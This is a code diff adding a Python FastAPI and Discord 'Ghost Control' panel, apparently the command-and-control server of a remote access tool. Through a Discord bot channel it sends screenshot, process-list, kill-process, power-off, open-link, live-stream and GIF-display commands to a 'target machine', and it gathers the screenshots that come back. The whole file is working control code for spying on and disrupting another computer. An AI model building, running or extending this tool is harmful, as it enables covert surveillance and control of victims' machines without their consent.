@@ -1,0 +1,492 @@
+# main.py
+import asyncio
+import json
+import os
+import sys
+from pathlib import Path
+from typing import Set, List, Dict
+
+import discord
+from discord.ext import commands
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query
+from fastapi.responses import HTMLResponse, JSONResponse
+from fastapi.staticfiles import StaticFiles
+
+print("Starting FastAPI + Discord controller service...")
+
+# ====== CONFIG ======
+CONTROLLER_TOKEN = os.getenv("CONTROLLER_TOKEN", "")
+COMMAND_CHANNEL_ID = int(os.getenv("COMMAND_CHANNEL_ID", "0"))
+TARGET_CHANNEL_ID  = int(os.getenv("TARGET_CHANNEL_ID", "0"))
+BOT_TAG = "[BOT1]"
+
+assert CONTROLLER_TOKEN, "Set CONTROLLER_TOKEN env var"
+assert COMMAND_CHANNEL_ID and TARGET_CHANNEL_ID, "Set COMMAND/TARGET channel IDs"
+# ====================
+
+
+# ====== Storage (Render-safe) ======
+ROOT_DIR = Path(__file__).resolve().parent
+DATA_DIR = Path("/tmp/data")
+DATA_DIR.mkdir(parents=True, exist_ok=True)
+# ===================================
+
+
+# ====== Optional system beep ======
+def play_tune(duration_sec: float = 5.0) -> None:
+    try:
+        if os.name == "nt":
+            import winsound
+            seq = [
+                (659, 300), (659, 300), (659, 600),
+                (0, 120),
+                (659, 300), (659, 300), (659, 600),
+                (0, 120),
+                (659, 300), (784, 300), (523, 300),
+                (587, 300), (659, 700),
+            ]
+            total = sum(t for _, t in seq)
+            scale = (duration_sec * 1000) / total if total else 1.0
+            for freq, ms in seq:
+                dur = max(60, int(ms * scale))
+                if freq > 0:
+                    winsound.Beep(int(freq), dur)
+                else:
+                    import time
+                    time.sleep(dur / 1000)
+        else:
+            import time
+            end = time.time() + duration_sec
+            pattern = [0.1, 0.1, 0.2, 0.1, 0.1, 0.2, 0.1, 0.15, 0.1, 0.1, 0.2]
+            idx = 0
+            while time.time() < end:
+                print("\a", end="", flush=True)
+                time.sleep(pattern[idx % len(pattern)])
+                idx += 1
+    except Exception:
+        print("\a", end="", flush=True)
+# ==================================
+
+
+# ====== Discord bot ======
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix="?", intents=intents)
+_controller_ready = asyncio.Event()
+
+async def _get_channel(channel_id: int):
+    ch = bot.get_channel(channel_id)
+    if ch is None:
+        ch = await bot.fetch_channel(channel_id)
+    return ch
+
+@bot.event
+async def on_ready():
+    print(f"Controller bot logged in as {bot.user}")
+    play_tune()
+    _controller_ready.set()
+# =========================
+
+
+# ====== WebSocket Hub ======
+class Hub:
+    def __init__(self):
+        self.clients: Set[WebSocket] = set()
+        self.lock = asyncio.Lock()
+
+    async def connect(self, ws: WebSocket):
+        await ws.accept()
+        async with self.lock:
+            self.clients.add(ws)
+
+    async def disconnect(self, ws: WebSocket):
+        async with self.lock:
+            self.clients.discard(ws)
+
+    async def broadcast(self, payload: dict):
+        dead = []
+        msg = json.dumps(payload)
+        async with self.lock:
+            for ws in list(self.clients):
+                try:
+                    await ws.send_text(msg)
+                except Exception:
+                    dead.append(ws)
+            for ws in dead:
+                self.clients.discard(ws)
+
+hub = Hub()
+# ============================
+
+
+# ====== Discord → Web UI pushes ======
+@bot.event
+async def on_message(message: discord.Message):
+    await bot.process_commands(message)
+
+    if message.author.bot and message.channel.id == TARGET_CHANNEL_ID:
+        payload = {
+            "type": "text",
+            "author": str(message.author),
+            "content": message.content,
+            "attachments": [],
+            "ts": message.created_at.isoformat()
+        }
+
+        # Save attachments (screenshots)
+        for att in message.attachments:
+            try:
+                b = await att.read()
+                fname = f"{att.id}_{att.filename}"
+                fpath = DATA_DIR / fname
+                with open(fpath, "wb") as f:
+                    f.write(b)
+                payload["attachments"].append({
+                    "filename": att.filename,
+                    "url": f"/files/{fname}"
+                })
+            except Exception as e:
+                payload["attachments"].append({
+                    "filename": att.filename,
+                    "error": str(e)
+                })
+
+        await hub.broadcast(payload)
+# =======================================
+
+
+# ====== FastAPI App ======
+app = FastAPI(title="Controller Panel")
+app.mount("/files", StaticFiles(directory=str(DATA_DIR)), name="files")
+
+
+@app.get("/files_index")
+async def files_index(limit: int = 24):
+    items: List[Dict[str, str]] = []
+    for p in sorted(DATA_DIR.glob("*"), key=lambda x: x.stat().st_mtime, reverse=True)[:limit]:
+        if p.is_file():
+            items.append({
+                "filename": p.name.split("_", 1)[-1],
+                "url": f"/files/{p.name}",
+                "mtime": p.stat().st_mtime
+            })
+    return {"files": items}
+# ========================
+
+
+# ====== CONTROL PANEL HTML ======
+# (full HTML is unchanged, I keep it 1:1)
+PANEL_HTML = """<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Ghost Control</title>
+  <style>
+    :root{
+      --bg:#05060c; --panel:#0d111c; --card:#11192a; --line:#1c263a; --text:#e7edf8; --muted:#9aa6c2;
+      --accent:#5fe0c5; --accent2:#4d82ff; --danger:#ff6b6b;
+    }
+    *{box-sizing:border-box;} body{margin:0; font:15px/1.55 "Inter","Segoe UI",Arial,sans-serif; background:radial-gradient(80% 60% at 10% 0%, rgba(93,175,255,.16), transparent), radial-gradient(65% 55% at 85% 0%, rgba(95,224,197,.12), transparent), var(--bg); color:var(--text);}
+    a{color:inherit;}
+    .page{max-width:1200px; margin:0 auto; padding:24px 16px 42px;}
+    header.hero{display:flex; align-items:center; justify-content:space-between; gap:12px; flex-wrap:wrap; padding:16px 18px; border:1px solid var(--line); border-radius:14px; background:rgba(16,21,33,.85); backdrop-filter:blur(6px);}
+    h1{margin:4px 0 0; font-size:24px;} .eyebrow{letter-spacing:0.28px; text-transform:uppercase; font-size:12px; color:var(--muted);}
+    .status{display:flex; gap:8px; flex-wrap:wrap; align-items:center;} .pill{display:inline-flex; align-items:center; gap:8px; padding:7px 11px; border:1px solid var(--line); border-radius:10px; background:var(--card); font-weight:700;} .dot{width:10px; height:10px; border-radius:50%; background:#f5c04a;} .dot.ok{background:#5fe0c5;} .dot.bad{background:var(--danger);}
+    .shell{margin-top:16px; border:1px solid var(--line); border-radius:16px; background:var(--panel); box-shadow:0 20px 50px rgba(0,0,0,.35); overflow:hidden;}
+    .tabbar{display:flex; gap:8px; padding:12px; border-bottom:1px solid var(--line); background:rgba(17,25,42,.75);}
+    .tab-btn{flex:1; border:1px solid var(--line); background:var(--card); color:var(--text); padding:10px 12px; border-radius:10px; cursor:pointer; font-weight:700; letter-spacing:0.2px; transition:all .18s ease;} 
+    .tab-btn.active{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#061021; border-color:transparent; transform:translateY(-1px); box-shadow:0 12px 30px rgba(79,136,255,.35);}
+    .panel{padding:18px 18px 20px; min-height:480px; position:relative;}
+    .view{position:absolute; inset:0; padding:18px; opacity:0; transform:translateY(10px); transition:opacity .22s ease, transform .22s ease; pointer-events:none;}
+    .view.active{opacity:1; transform:translateY(0); pointer-events:auto;}
+    .grid{display:grid; grid-template-columns:1.05fr .95fr; gap:14px;} @media(max-width:960px){.grid{grid-template-columns:1fr;}}
+    .card{border:1px solid var(--line); border-radius:12px; background:var(--card); padding:14px;}
+    .head{display:flex; justify-content:space-between; gap:10px; align-items:center; flex-wrap:wrap; margin-bottom:10px;} h3{margin:0;}
+    .btn{border:1px solid var(--line); background:var(--card); color:var(--text); padding:9px 12px; border-radius:10px; font-weight:700; cursor:pointer; transition:transform .08s ease, filter .15s ease;} .btn:hover{filter:brightness(1.06); transform:translateY(-1px);} .btn.primary{background:linear-gradient(120deg,var(--accent),var(--accent2)); color:#061021; border:none;} .btn.danger{background:var(--danger); border-color:var(--danger); color:#061021;}
+    .stack{display:grid; gap:10px;} .row{display:flex; gap:8px; flex-wrap:wrap;} input{flex:1; min-width:220px; padding:10px 12px; border-radius:10px; border:1px solid var(--line); background:#0a0f1a; color:var(--text);} label{font-weight:700;}
+    .feed{display:flex; flex-direction:column; gap:10px; max-height:420px; overflow:auto; padding-right:4px;} .feed.small{max-height:360px;} .item{border:1px solid var(--line); border-radius:10px; padding:10px 12px; background:rgba(14,19,30,.9);} .meta{font-size:12px; color:var(--muted); margin-bottom:6px; word-break:break-word;}
+    .gallery{display:grid; grid-template-columns: repeat(auto-fit, minmax(200px,1fr)); gap:10px;} .shot{border:1px solid var(--line); border-radius:12px; overflow:hidden; background:#0b0f19; cursor:pointer;} .shot img{width:100%; display:block;}
+    #toast{position:fixed; left:50%; bottom:18px; transform:translateX(-50%); padding:9px 14px; border-radius:12px; border:1px solid var(--line); background:var(--panel); font-weight:700; opacity:0; transition:opacity .18s ease; z-index:120;}
+  </style>
+</head>
+<body>
+  <div class="page">
+    <header class="hero">
+      <div>
+        <div class="eyebrow">Receiver console</div>
+        <h1>Ghost Control</h1>
+        <div class="muted">Minimal live control surface.</div>
+      </div>
+      <div class="status">
+        <div class="pill"><span id="dot" class="dot"></span><span id="stxt">Connecting...</span></div>
+        <div class="pill">Cmd {COMMAND_CHANNEL_ID}</div>
+        <div class="pill">Tag {BOT_TAG}</div>
+        <div class="pill" id="uptime">00:00</div>
+      </div>
+    </header>
+
+    <div class="shell">
+      <div class="tabbar">
+        <button class="tab-btn active" data-tab="dash">Dashboard</button>
+        <button class="tab-btn" data-tab="shots">Screenshots</button>
+        <button class="tab-btn" data-tab="procs">Processes</button>
+        <button class="tab-btn" data-tab="logs">Logs</button>
+      </div>
+      <div class="panel">
+        <div id="tab-dash" class="view active">
+          <div class="grid">
+            <div class="card">
+              <div class="head">
+                <div><div class="eyebrow">Live</div><h3>Stream control</h3></div>
+                <div class="row" style="gap:6px">
+                  <input id="monitorIdx" style="max-width:80px" placeholder="1" value="1"/>
+                  <button class="btn primary" onclick="startLive()">Start live</button>
+                </div>
+              </div>
+              <div class="stack" style="margin-bottom:12px">
+                <label for="streamUrl">Open existing stream URL</label>
+                <div class="row">
+                  <input id="streamUrl" placeholder="http://host:8081/stream"/>
+                  <button class="btn" onclick="viewStream()">Open overlay</button>
+                </div>
+              </div>
+              <div class="head" style="margin-top:6px">
+                <div><div class="eyebrow">Quick actions</div><h3>Commands</h3></div>
+              </div>
+              <div class="stack">
+                <div class="row">
+                  <button class="btn" onclick="doShot()">Screenshot</button>
+                  <button class="btn" onclick="doProcs()">Processes</button>
+                  <button class="btn danger" onclick="confirmPower()">Power off</button>
+                  <button class="btn primary" onclick="displayGif()">Display gif</button>
+                </div>
+                <div>
+                  <label for="openUrl">Open link</label>
+                  <div class="row">
+                    <input id="openUrl" placeholder="https://example.com"/>
+                    <button class="btn" onclick="openLink()">Open</button>
+                  </div>
+                </div>
+                <div>
+                  <label for="procName">Kill process</label>
+                  <div class="row">
+                    <input id="procName" placeholder="chrome.exe"/>
+                    <button class="btn" onclick="killProc()">Kill</button>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class="card">
+              <div class="head">
+                <div><div class="eyebrow">Feed</div><h3>Live log</h3></div>
+              </div>
+              <div id="timeline" class="feed"></div>
+            </div>
+          </div>
+        </div>
+
+        <div id="tab-shots" class="view" aria-hidden="true">
+          <div class="card" style="height:100%; display:flex; flex-direction:column;">
+            <div class="head">
+              <div><div class="eyebrow">Captures</div><h3>Screenshots</h3></div>
+            </div>
+            <div id="gallery" class="gallery"></div>
+          </div>
+        </div>
+
+        <div id="tab-procs" class="view" aria-hidden="true">
+          <div class="card" style="height:100%; display:flex; flex-direction:column;">
+            <div class="head">
+              <div><div class="eyebrow">Processes</div><h3>Process lists</h3></div>
+              <button class="btn" onclick="doProcs()">Refresh</button>
+            </div>
+            <div id="procFeed" class="feed small"></div>
+          </div>
+        </div>
+
+        <div id="tab-logs" class="view" aria-hidden="true">
+          <div class="card" style="height:100%; display:flex; flex-direction:column;">
+            <div class="head">
+              <div><div class="eyebrow">History</div><h3>Logs</h3></div>
+              <button class="btn" onclick="clearLogs()">Clear</button>
+            </div>
+            <div id="logFeed" class="feed small"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="toast"></div>
+
+  <script>
+    const el = {dot:document.getElementById('dot'), stxt:document.getElementById('stxt'), timeline:document.getElementById('timeline'), gallery:document.getElementById('gallery'), procFeed:document.getElementById('procFeed'), logFeed:document.getElementById('logFeed'), uptime:document.getElementById('uptime')};
+    let startedAt = Date.now(); setInterval(()=>{ const s=((Date.now()-startedAt)/1000|0); const m=(s/60|0), ss=s%60; el.uptime.textContent=`${String(m).padStart(2,'0')}:${String(ss).padStart(2,'0')}`; },1000);
+
+    function setStatus(ok){ el.dot.className='dot '+(ok?'ok':'bad'); el.stxt.textContent = ok ? 'Connected' : 'Reconnecting...'; }
+    function toast(t){ const n=document.getElementById('toast'); n.textContent=t; n.style.opacity='1'; setTimeout(()=> n.style.opacity='0', 1500); }
+
+    function node(author, content, ts){ const d=document.createElement('div'); d.className='item'; const m=document.createElement('div'); m.className='meta'; const time=ts? new Date(ts).toLocaleString(): new Date().toLocaleString(); m.textContent = `${time} - ${author}`; const b=document.createElement('div'); b.textContent = content || ''; d.appendChild(m); d.appendChild(b); return d; }
+    function addFeed(container, div, limit=200){ container.prepend(div); while(container.children.length>limit) container.lastChild.remove(); }
+    function addShot(url){ if(!url) return; const wrap=document.createElement('div'); wrap.className='shot'; const img=document.createElement('img'); img.loading='lazy'; img.src=url; wrap.onclick=()=> window.open(url,'_blank'); wrap.appendChild(img); el.gallery.prepend(wrap); while(el.gallery.children.length>60) el.gallery.lastChild.remove(); }
+    function addProc(text){ addFeed(el.procFeed, node('Processes', text, Date.now()), 120); }
+    function addLog(div){ addFeed(el.logFeed, div, 300); }
+
+    function setTab(id){
+      ['dash','shots','procs','logs'].forEach(t=>{
+        const view=document.getElementById(`tab-${t}`);
+        const active=t===id;
+        view.classList.toggle('active', active);
+        view.setAttribute('aria-hidden', active?'false':'true');
+      });
+      document.querySelectorAll('.tab-btn').forEach(b=> b.classList.toggle('active', b.dataset.tab===id));
+    }
+    document.querySelectorAll('.tab-btn').forEach(btn=> btn.onclick = ()=> setTab(btn.dataset.tab));
+
+    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
+    connectWS();
+
+    async function post(path){ const r = await fetch(path,{method:'POST'}); const data = await r.json().catch(()=>({})); if(!r.ok) throw new Error(data.error||'Request failed'); return data; }
+    async function startLive(){ const m=document.getElementById('monitorIdx').value.trim()||'1'; try{ await post('/cmd/live_start?monitor='+encodeURIComponent(m)); toast('Live stream starting'); } catch(e){ toast(e.message);} }
+    async function viewStream(){ const url=document.getElementById('streamUrl').value.trim(); if(!url){toast('Enter stream URL'); return;} try{ await post('/cmd/show_stream?url='+encodeURIComponent(url)); toast('Stream overlay sent'); } catch(e){ toast(e.message);} }
+    async function doShot(){ try{ await post('/cmd/ss'); toast('Screenshot requested'); } catch(e){ toast(e.message);} }
+    async function doProcs(){ try{ await post('/cmd/ps'); toast('Process list requested'); } catch(e){ toast(e.message);} }
+    async function openLink(){ const url=document.getElementById('openUrl').value.trim(); if(!url){toast('Enter a URL'); return;} const safe=(url.startsWith('http://')||url.startsWith('https://'))?url:'http://'+url; try{ await post('/cmd/open?url='+encodeURIComponent(safe)); toast('Open link sent'); } catch(e){ toast(e.message);} }
+    async function killProc(){ const name=document.getElementById('procName').value.trim(); if(!name){toast('Enter a process name'); return;} try{ await post('/cmd/close?name='+encodeURIComponent(name)); toast('Kill command sent'); } catch(e){ toast(e.message);} }
+    async function confirmPower(){ if(!confirm('Power off the target machine?')) return; try{ await post('/cmd/poweroff'); toast('Power off sent'); } catch(e){ toast(e.message);} }
+    async function displayGif(){ try{ await post('/cmd/display_gif'); toast('Display gif sent'); } catch(e){ toast(e.message);} }
+    function clearLogs(){ el.logFeed.innerHTML=''; }
+
+    fetch('/files_index').then(r=>r.json()).then(j=>{ (j.files||[]).forEach(f=> addShot(f.url)); }).catch(()=>{});
+  </script>
+</body>
+</html>""" 
+
+
+@app.get("/", response_class=HTMLResponse)
+async def index():
+    return HTMLResponse(PANEL_HTML)
+
+
+@app.websocket("/ws")
+async def ws_endpoint(ws: WebSocket):
+    try:
+        await hub.connect(ws)
+        await ws.send_text(json.dumps({
+            "type": "text",
+            "author": "Panel",
+            "content": "Connected to live stream.",
+            "attachments": [],
+            "ts": ""
+        }))
+        while True:
+            await ws.receive_text()
+    except WebSocketDisconnect:
+        await hub.disconnect(ws)
+    except Exception:
+        await hub.disconnect(ws)
+# ========================================
+
+
+# ====== Discord Command Senders ======
+async def _send_cmd(msg: str):
+    await _controller_ready.wait()
+    ch = await _get_channel(COMMAND_CHANNEL_ID)
+    await ch.send(msg)
+
+async def _send_cmd_with_file(msg: str, file_path: Path):
+    await _controller_ready.wait()
+    ch = await _get_channel(COMMAND_CHANNEL_ID)
+    async with ch.typing():
+        with open(file_path, "rb") as f:
+            await ch.send(msg, file=discord.File(f, filename=file_path.name))
+
+async def _send_cmd_with_files(msg: str, file_paths: List[Path]):
+    await _controller_ready.wait()
+    ch = await _get_channel(COMMAND_CHANNEL_ID)
+    files = []
+    handles = []
+    try:
+        for path in file_paths:
+            handle = open(path, "rb")
+            handles.append(handle)
+            files.append(discord.File(handle, filename=path.name))
+        async with ch.typing():
+            await ch.send(msg, files=files)
+    finally:
+        for h in handles:
+            try: h.close()
+            except: pass
+# =====================================
+
+
+# ====== HTTP API → Discord Commands ======
+@app.post("/cmd/ss")
+async def cmd_ss():
+    await _send_cmd(f"{BOT_TAG} REQUEST_SCREENSHOT")
+    return {"ok": True}
+
+@app.post("/cmd/ps")
+async def cmd_ps():
+    await _send_cmd(f"{BOT_TAG} LIST_PROCESSES")
+    return {"ok": True}
+
+@app.post("/cmd/open")
+async def cmd_open(url: str = Query(..., min_length=1)):
+    if not (url.startswith("http://") or url.startswith("https://")):
+        url = "http://" + url
+    await _send_cmd(f"{BOT_TAG} OPEN_LINK {url}")
+    return {"ok": True, "url": url}
+
+@app.post("/cmd/close")
+async def cmd_close(name: str = Query(..., min_length=1)):
+    await _send_cmd(f"{BOT_TAG} KILL_PROCESS {name}")
+    return {"ok": True}
+
+@app.post("/cmd/poweroff")
+async def cmd_poweroff():
+    await _send_cmd(f"{BOT_TAG} POWER_OFF")
+    return {"ok": True}
+
+@app.post("/cmd/live_start")
+async def cmd_live_start(monitor: int = Query(1, ge=1)):
+    await _send_cmd(f"{BOT_TAG} START_LIVE {monitor}")
+    return {"ok": True}
+
+@app.post("/cmd/show_stream")
+async def cmd_show_stream(url: str = Query(..., min_length=1)):
+    await _send_cmd(f"{BOT_TAG} SHOW_STREAM {url}")
+    return {"ok": True}
+
+@app.post("/cmd/display_gif")
+async def cmd_display_gif():
+    gif_path = ROOT_DIR / "display.gif"
+    sound_path = ROOT_DIR / "sound.mp3"
+    missing = []
+    if not gif_path.is_file():
+        missing.append("display.gif")
+    if not sound_path.is_file():
+        missing.append("sound.mp3")
+    if missing:
+        return JSONResponse({"ok": False, "error": f"Missing: {', '.join(missing)}"}, status_code=404)
+
+    await _send_cmd_with_files(f"{BOT_TAG} DISPLAY_GIF", [gif_path, sound_path])
+    return {"ok": True}
+
+@app.get("/health")
+async def health():
+    return {"ok": True}
+# ==========================================
+
+
+# ====== Startup / Shutdown ======
+@app.on_event("startup")
+async def _startup():
+    asyncio.create_task(bot.start(CONTROLLER_TOKEN))
+
+@app.on_event("shutdown")
+async def _shutdown():
+    await bot.close()
+# =================================
+
